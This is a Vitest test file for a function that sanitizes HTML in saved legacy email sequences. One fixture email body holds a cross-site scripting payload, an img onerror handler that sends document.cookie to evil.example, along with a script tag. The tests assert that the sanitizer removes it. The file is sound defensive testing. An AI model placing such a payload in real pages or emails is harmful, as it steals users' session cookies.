// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { normalizeSavedSequence } from "@/lib/storage/sequences";
import type { SavedSequence } from "@/types";

function buildLegacySequence(overrides?: Partial<SavedSequence>): SavedSequence {
  return {
    id: "seq-legacy-1",
    name: "Legacy Co — old prospects",
    businessName: "Legacy Co",
    senderName: "Faiza Ijaz",
    recipientFirstName: "",
    industry: "saas",
    targetAudience: "old prospects",
    painPoint: "slow onboarding",
    offer: "a faster onboarding flow",
    tone: "professional",
    emailLength: "medium",
    ctaType: "quick-reply",
    framework: "AIDA",
    emails: [
      {
        slot: "introduction",
        label: "Email 1 — Introduction",
        subject: "idea for Legacy Co",
        body: '<p>Hi John,</p><img src=x onerror="fetch(\'https://evil.example/c?c=\'+document.cookie)"><script>alert(1)</script>',
        format: "html",
        delayDays: 0,
      },
    ],
    score: 70,
    status: "draft",
    createdAt: "2026-01-01T00:00:00.000Z",
    updatedAt: "2026-01-01T00:00:00.000Z",
    ...overrides,
  };
}

describe("normalizeSavedSequence — legacy HTML sanitization", () => {
  it("sanitizes unsafe HTML in an already-stored (legacy) sequence on read", () => {
    const legacy = buildLegacySequence();

    const normalized = normalizeSavedSequence(legacy);

    expect(normalized.emails[0]?.body).not.toMatch(/onerror/i);
    expect(normalized.emails[0]?.body).not.toMatch(/<script/i);
    expect(normalized.emails[0]?.body).not.toMatch(/evil\.example/i);
    expect(normalized.emails[0]?.body).toContain("Hi John,");
  });

  it("does not touch plain-format bodies with an HTML sanitizer", () => {
    const legacy = buildLegacySequence({
      emails: [
        {
          slot: "introduction",
          label: "Email 1 — Introduction",
          subject: "s",
          body: "Hi John, <this is not a tag> just plain text with a stray angle bracket.",
          format: "plain",
          delayDays: 0,
        },
      ],
    });

    const normalized = normalizeSavedSequence(legacy);

    expect(normalized.emails[0]?.body).toBe(legacy.emails[0]?.body);
  });

  it("does not crash on malformed/unexpected HTML", () => {
    const legacy = buildLegacySequence({
      emails: [
        {
          slot: "introduction",
          label: "Email 1 — Introduction",
          subject: "s",
          body: "<p>unclosed paragraph <strong>bold <em>and unclosed em",
          format: "html",
          delayDays: 0,
        },
      ],
    });

    expect(() => normalizeSavedSequence(legacy)).not.toThrow();
    expect(normalizeSavedSequence(legacy).emails[0]?.body).toContain("bold");
  });

  it("leaves an already-clean sequence's HTML untouched (referentially stable)", () => {
    const clean = buildLegacySequence({
      emails: [
        {
          slot: "introduction",
          label: "Email 1 — Introduction",
          subject: "s",
          body: "<p>Hi <strong>John</strong>,</p><p>Body text.</p>",
          format: "html",
          delayDays: 0,
        },
      ],
    });

    const normalized = normalizeSavedSequence(clean);

    expect(normalized).toBe(clean);
  });
});
